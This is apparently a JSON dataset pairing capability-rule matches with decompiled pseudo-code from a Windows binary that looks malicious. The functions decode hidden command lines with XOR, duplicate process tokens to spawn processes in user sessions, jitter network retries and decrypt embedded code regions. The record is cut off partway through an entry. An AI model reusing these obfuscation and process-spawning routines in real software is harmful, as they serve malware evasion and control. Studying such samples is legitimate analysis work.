{
    "00401035": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00401035(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t *var_2ch;\n    int32_t *var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = -1;\n    var_14h = *0x41ccc0;\n    var_58h = 0xc0d5215;\n    var_54h = 0x58133e56;\n    var_50h = 0x34580207;\n    var_4ch = 0x18015e19;\n    var_48h = 0x44072a42;\n    var_44h = 0x20441e1b;\n    var_40h = 0x45404a0d;\n    var_3ch = 0x346696c;\n    var_38h = 0x6f055d5a;\n    var_34h = 0x685e094c;\n    var_24h = 0x686e3074;\n    var_20h._0_2_ = 0x5833;\n    var_28h = param_2;\n    fcn.00401000(0x28);\n    iVar1 = var_10h;\n    iVar5 = 0;\n    iVar4 = &var_58h - var_10h;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar2 != 0x9f0eb9) {\n            var_10h = 6;\n            *(iVar5 + iVar1) = *(&var_24h + iVar5 % 6) ^ (iVar5 + iVar1)[iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x28);\n    pcVar6 = \"3333\";\n    var_4h = 0;\n    do {\n        var_10h = 1;\n        iVar4 = 0;\n        do {\n            if ((pcVar6[var_4h] != '\\0') && (iVar5 = (*_sym.imp.ntdll.dll_strchr)(iVar1, pcVar6[var_4h]),  iVar5 == 0))\n            {\n                iVar5 = 0;\n                break;\n            }\n            iVar4 = iVar4 + 1;\n            iVar5 = var_10h;\n        } while (iVar4 < 0x20);\n        if (((*pcVar6 != '\\0') && (pcVar6[0x1f] == '\\0')) && (iVar5 != 0)) {\n            var_10h = 0;\n            iVar4 = -1;\n            var_24h = var_1ch * 10;\n            do {\n                var_30h = 0;\n                var_2ch = NULL;\n                var_8h = 0;\n                var_ch = 0;\n                iVar5 = fcn.004041af(var_24h, 0, &var_ch, &var_8h);\n                if (iVar5 == 0) {\n                    if (var_8h == var_ch) {\n                        if (var_30h == 4) {\n                            iVar4 = *var_2ch;\n                        }\n                        fcn.0040ba41();\n                    }\n                    if (iVar4 != -1) goto code_r0x004011f2;\n                }\n                else {\n                    (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n                }\n                var_10h = var_10h + 1;\n            } while (var_10h < 5);\n            if (iVar4 != -1) {\ncode_r0x004011f2:\n                *var_28h = iVar4;\n                var_18h = var_4h;\n                goto code_r0x004011fd;\n            }\n            var_14h = var_14h * 0x19660d + 0x3c6ef35f;\n            (*_sym.imp.KERNEL32.dll_Sleep)(var_14h % 600000 + 60000);\n        }\n        pcVar6 = pcVar6 + 0x20;\n        var_4h = var_4h + 1;\n        if (0x41ca4f < pcVar6) {\ncode_r0x004011fd:\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            return var_18h;\n        }\n    } while( true );\n}\n",
        "token_count": 1200
    },
    "00401217": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00401217(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint *puVar6;\n    char *pcVar7;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar4 = NULL;\n    puVar6 = &var_ch;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    if (((*in_ECX != 0) && (in_ECX[1] != 0)) && (iVar2 = fcn.00409116(),  -1 < iVar2)) {\n        uVar3 = 0;\n        var_4h = 0x44444444;\n        if (var_ch != 4) {\n            do {\n                iVar2 = 0;\n                while (*(iVar2 + uVar3 + var_8h) == *(&var_4h + iVar2)) {\n                    iVar2 = iVar2 + 1;\n                    if (3 < iVar2) {\n                        pcVar4 = uVar3 + var_8h;\n                        goto code_r0x00401280;\n                    }\n                }\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < var_ch - 4U);\n        }\ncode_r0x00401280:\n        if (pcVar4 != NULL) {\n            pcVar5 = pcVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar5 = '\\0';\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = \"3333\";\n            pcVar7 = pcVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar7 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n                pcVar7 = pcVar7 + 1;\n            }\n            pcVar5 = pcVar4;\n            for (iVar2 = 0x140; pcVar1 = _sym.imp.KERNEL32.dll_lstrcpyA,  iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar5 = '\\0';\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = \"3333\";\n            (*_sym.imp.KERNEL32.dll_lstrcpyA)(pcVar4, \"3333\" + arg_8h * 0x20);\n            do {\n                pcVar4 = pcVar4 + 0x20;\n                if (*pcVar5 != '\\0') {\n                    (*pcVar1)(pcVar4, pcVar5);\n                }\n                pcVar5 = pcVar5 + 0x20;\n            } while (pcVar5 < 0x41ca30);\n        }\n        fcn.0040ba41();\n        *0x41caa4 = var_ch;\n        pcVar4 = 0x1;\n        *0x41caa8 = var_8h;\n    }\n    return pcVar4;\n}\n",
        "token_count": 756
    },
    "0040130a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004013d3)\n// WARNING: Removing unreachable block (ram,0x004013ee)\n// WARNING: Removing unreachable block (ram,0x004013f5)\n// WARNING: Removing unreachable block (ram,0x004013fc)\n// WARNING: Removing unreachable block (ram,0x00401415)\n\nuint __cdecl fcn.0040130a(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint32_t uStack420;\n    \n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201);\n    puVar3 = &stack0xfffffe50;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = 0x41caa4;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = fcn.0040bb2f();\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41cd30);\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    cVar1 = fcn.0040b4fa();\n    if ((cVar1 != '\\0') && (iVar2 = fcn.00401217(0),  iVar2 != 0)) {\n        fcn.0040ba41();\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41cd30);\n    }\n    while (*0x41cdf4 == 0) {\n        iVar2 = fcn.00401035();\n        if (iVar2 != -1) {\n            fcn.004041fb();\n        }\n        uStack420 = uStack420 * 0x19660d + 0x3c6ef35f;\n        (*_sym.imp.KERNEL32.dll_Sleep)(uStack420 % 600000 + 60000);\n    }\n    return 0;\n}\n",
        "token_count": 498
    },
    "00402dba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00402dba(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t *piVar8;\n    uint *puVar9;\n    uint lpCommandLine;\n    int32_t var_b0h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint TokenHandle;\n    int32_t var_58h;\n    uint pSessionId;\n    int32_t var_50h;\n    uint var_4ch;\n    uint pSid;\n    int32_t *var_44h;\n    uint hExistingToken;\n    uint pIdentifierAuthority;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint hToken;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4ch = 4;\n    var_38h._0_2_ = 0x1000;\n    piVar8 = param_2;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *piVar8 = 0;\n        piVar8 = piVar8 + 1;\n    }\n    pSessionId = 0;\n    puVar9 = &lpCommandLine;\n    var_44h = param_2;\n    for (iVar6 = 0x44; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hToken = 0;\n    puVar9 = &var_64h;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hExistingToken = 0;\n    var_34h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    iVar6 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (iVar6 != 0) {\n        var_68h = iVar6;\n        iVar2 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(param_1, &pSessionId);\n        pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(iVar6, 0x201eb, &hExistingToken);\n            if (iVar2 != 0) {\n                fcn.00401a42();\n                iVar2 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar2 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar6 != 0) {\n                        var_60h = 0x20;\n                        var_64h = pSid;\n                        iVar6 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar1)(hToken, 0x19, &var_64h, iVar6 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_6ch = 0;\n                    (*pcVar1)(hToken, 0x1b, &var_6ch, 4);\n                    iVar6 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_34h, hToken, 1);\n                    if (iVar6 == 0) {\n                        var_34h = 0;\n                    }\n                    else {\n                        var_4ch = 0x404;\n                    }\n                    lpCommandLine = 0x44;\n                    var_2ch = 0x6a3c5a3c;\n                    var_28h = 0x5a384a17;\n                    var_24h = 0x4a186a21;\n                    var_20h = 0x6a095a7b;\n                    var_1ch = 0x5a2e4a1d;\n                    var_18h = 0x4a186a33;\n                    var_14h = 0x6a395a3e;\n                    var_10h._0_1_ = 0xd;\n                    var_10h._1_2_ = 0x4b4a;\n                    var_10h._3_1_ = 0x5a;\n                    var_8h = 0x6a555a4b;\n                    var_4h._0_2_ = 0x4a79;\n                    fcn.00401000(0x40);\n                    iVar6 = var_50h;\n                    iVar2 = 0;\n                    var_58h = 6;\n                    var_30h = &var_2ch - var_50h;\n                    do {\n                        iVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                        if (iVar3 != 0xe7b428) {\n                            *(iVar2 + iVar6) = *(&var_8h + iVar2 % var_58h) ^ (iVar2 + iVar6)[var_30h];\n                        }\n                        iVar2 = iVar2 + 1;\n                    } while (iVar2 < 0x20);\n                    var_24h = 0x6b0f5106;\n                    var_20h = 0x511d7954;\n                    var_1ch = 0x79446b16;\n                    var_18h = 0x6b575101;\n                    var_14h = 0x510d7952;\n                    var_10h._0_1_ = 0x1c;\n                    var_10h._1_2_ = 0x376b;\n                    var_10h._3_1_ = 0x79;\n                    var_8h = 0x6b795175;\n                    var_4h._0_2_ = 0x7937;\n                    fcn.00401000(0x30);\n                    iVar6 = var_30h;\n                    iVar3 = 0;\n                    iVar2 = &var_24h - var_30h;\n                    do {\n                        iVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                        piVar8 = var_44h;\n                        if (iVar4 != 0x73ea4c) {\n                            *(iVar3 + iVar6) = *(&var_8h + iVar3 % var_58h) ^ (iVar3 + iVar6)[iVar2];\n                        }\n                        iVar3 = iVar3 + 1;\n                    } while (iVar3 < 0x18);\n                    var_88h._0_2_ = 0;\n                    var_b0h = var_50h;\n                    var_8ch = 1;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, iVar6, 0, 0, 0, 0, var_4ch, var_34h, 0, &lpCommandLine, var_44h);\n                    pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (*piVar8 != 0) {\n                        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*piVar8, 0x201eb, &TokenHandle);\n                        if (iVar2 != 0) {\n                            fcn.00401a42();\n                            (*pcVar7)(TokenHandle);\n                        }\n                        (*pcVar7)(var_44h[1]);\n                    }\n                    if (var_34h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_34h);\n                    }\n                    (*pcVar7)(hToken);\n                    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                    uVar5 = (*pcVar1)(0, var_50h);\n                    (*pcVar7)(uVar5);\n                    pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    param_2 = var_44h;\n                    iVar6 = var_68h;\n                }\n                (*pcVar7)(hExistingToken);\n            }\n        }\n        (*pcVar7)(iVar6);\n    }\n    return *param_2;\n}\n",
        "token_count": 2132
    },
    "004030de": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004030de(uint *param_1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint lpCommandLine;\n    uint var_9ch;\n    int32_t var_58h;\n    uint *var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_3fh;\n    uint var_3bh;\n    uint var_37h;\n    uint var_33h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uint var_13h;\n    uint var_fh;\n    uint var_bh;\n    uint var_4h;\n    \n    var_4ch = 0x7163674d;\n    iVar4 = 0x44;\n    var_48h = 0x671b544d;\n    puVar5 = param_1;\n    for (iVar3 = 0x10; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    var_3bh._3_1_ = 0x44;\n    stack0xffffffb9 = 0x5545171;\n    puVar5 = &var_9ch;\n    var_54h = param_1;\n    var_44h._0_1_ = var_3bh._3_1_;\n    for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    var_9ch = 0x44;\n    var_3fh = 0x5b716267;\n    puVar5 = &lpCommandLine;\n    for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    var_3bh._0_2_ = 0x754;\n    var_3bh._2_1_ = 0x67;\n    var_37h = 0x34541171;\n    var_33h = 0x4d714367;\n    var_2fh._0_2_ = 0x1b54;\n    var_2fh._2_1_ = 0x67;\n    var_2bh = 0x5545171;\n    var_27h._0_2_ = 0x367;\n    var_27h._2_1_ = 0x71;\n    var_58h = 6;\n    var_27h._3_1_ = 6;\n    var_23h = 0x43673454;\n    var_1fh = 0xb544271;\n    var_1bh = 0x5b715867;\n    var_17h._0_2_ = 0x1b54;\n    var_17h._2_1_ = 0x67;\n    var_13h = 0xd541a71;\n    var_fh = 0x51714867;\n    var_bh._0_2_ = 0x6854;\n    var_bh._2_1_ = 0x67;\n    stack0xfffffff4 = 0x71306768;\n    var_4h._0_2_ = 0x5434;\n    var_2fh._3_1_ = var_3bh._3_1_;\n    var_17h._3_1_ = var_3bh._3_1_;\n    fcn.00401000(0x88);\n    iVar3 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar4 != 0x408959) {\n            *(iVar3 + var_50h) = *(&var_bh + iVar3 % var_58h + 3) ^ (iVar3 + var_50h)[&var_4ch - var_50h];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x44);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(var_50h, &lpCommandLine, 0x104);\n    puVar5 = var_54h;\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0x800000c, 0, 0, &var_9ch, var_54h);\n    if (puVar5[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar5[1]);\n    }\n    uVar1 = *puVar5;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_50h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return uVar1;\n}\n",
        "token_count": 1176
    },
    "00403260": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403260(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    ushort uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    uint32_t uStack580;\n    uint uStack576;\n    int32_t iStack572;\n    ulong uStack568;\n    uint uStack560;\n    uint uStack556;\n    int32_t iStack552;\n    uint uStack548;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    uStack568 = 0;\n    uStack560 = 0;\n    uStack580 = 0;\n    uStack556 = 0;\n    iStack572 = 0;\n    auStack544 = ZEXT816(0);\n    iStack552 = 0;\n    uStack548 = 0;\n    iStack528 = 0;\n    sub.ntdll.dll_memset(auStack526, 0, 0x206);\n    if (*0x41cd40 == 0) {\n        *0x41caac = fcn.004030de();\n        uStack568._0_4_ = *0x41caa8;\n        iVar7 = *0x41caa4;\n    }\n    else {\n        *0x41caac = fcn.00402dba();\n        iVar4 = fcn.004064b2(&iStack572);\n        uStack568._0_4_ = uStack580;\n        iVar7 = iStack572;\n        if (iVar4 != 0) {\n            goto code_r0x0040332d;\n        }\n    }\n    uStack568._4_4_ = uStack568 >> 0x1f;\n    uStack568 = uStack568;\n    iStack552 = iVar7;\ncode_r0x0040332d:\n    iVar7 = iStack552;\n    if (*0x41caac == 0) {\n        piVar6 = &iStack528;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        if (piVar6 - auStack526 >> 1 != 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&iStack528);\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar3);\n        }\n    }\n    else {\n        fcn.00401468();\n        if ((iVar7 != 0) && ((uStack568 | uStack568._4_4_) != 0)) {\n            fcn.0040b805();\n            fcn.00407b36((*0x41cd38 & 1) << 4);\n        }\n        uStack580 = *0x41caac;\n        uStack576 = *0x41cd30;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &uStack580, 0, 0xffffffff);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41caac, 0);\n        uVar5 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00403260, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar5);\n        (*pcVar2)(*0x41caac);\n    }\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 842
    },
    "00403404": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403404(uint noname_0, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint var_30ch;\n    uint var_104h;\n    \n    var_30ch._0_2_ = 0;\n    sub.ntdll.dll_memset(&var_30ch + 2, 0, 0x206);\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if (*0x41cd40 == 0) {\n        uVar6 = 0;\n        do {\n            if (*(uVar6 + 0x40fb10) == arg_ch) {\n                if (arg_10h == *0x41cd34) {\n                    return 1;\n                }\n                if (arg_ch == -0x37b0bf10) {\n                    puVar7 = &var_104h;\n                    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                    var_104h._0_1_ = 0;\n                    if ((arg_14h != 0) &&\n                       (iVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, arg_14h),  iVar4 != 0)) {\n                        (*_sym.imp.PSAPI.DLL_GetProcessImageFileNameA)(iVar4, &var_104h, 0x104);\n                        (*pcVar1)(iVar4);\n                    }\n                    pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n                    iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_104h);\n                    if (iVar4 != 0) {\n                        (*pcVar2)(&var_104h);\n                        iVar4 = fcn.00406dcf();\n                        if (iVar4 == -0x37b0bf10) {\n                            return 1;\n                        }\n                    }\n                }\n                iVar4 = fcn.004016b8();\n                if (iVar4 != 0) {\n                    return 1;\n                }\n                puVar7 = &var_30ch;\n                for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                iVar4 = fcn.00401468();\n                if (iVar4 == 0) {\n                    return 1;\n                }\n                iVar4 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&var_30ch, 0x41cab0);\n                if (iVar4 != 0) {\n                    return 1;\n                }\n                uVar5 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040196a, arg_10h, 0, 0);\n                (*pcVar1)(uVar5);\n                return 1;\n            }\n            uVar6 = uVar6 + 4;\n        } while (uVar6 < 0x2c);\n    }\n    else if ((((arg_ch == 0x74fc6984) && (iVar4 = fcn.004016b8(),  iVar4 == 0)) && (iVar4 = fcn.00401468(),  iVar4 != 0)\n             ) && (iVar3 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&var_30ch),  iVar3 == 0)) {\n        (*_sym.imp.KERNEL32.dll_AddAtomW)(&var_30ch);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0xc);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n        *(iVar4 + 8) = arg_10h;\n        uVar5 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00403260, iVar4, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar5);\n    }\n    return 1;\n}\n",
        "token_count": 987
    },
    "00403790": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403790(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    \n    if (((*0x41cd40 == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41cd30, 0xffffffff),  iVar2 == 0))\n       && (*arg_8h == 0x20)) {\n        puVar6 = 0x41cab0;\n        for (iVar2 = 0x208; pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcessId,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.00401468();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0xc);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        piVar4[1] = arg_8h[2];\n        *piVar4 = arg_8h[1];\n        iVar2 = (*pcVar1)();\n        piVar4[2] = iVar2;\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00403260, piVar4, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    }\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x418220) = *(uVar5 + 0x418220) ^ *(uVar5 % 0xc + 0x418210);\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x4400);\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x412010) = *(uVar5 + 0x412010) ^ \"bIG0iEw66qDx\\x01\"[uVar5 % 0xc];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x6200);\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004035d0, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    while (*0x41cdf4 == 0) {\n        fcn.004094f9();\n        if (*0x41cd40 != 0) {\n            (*pcVar1)(1000);\n        }\n        (*pcVar1)(0x1e);\n    }\n    return 0;\n}\n",
        "token_count": 672
    },
    "00403951": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
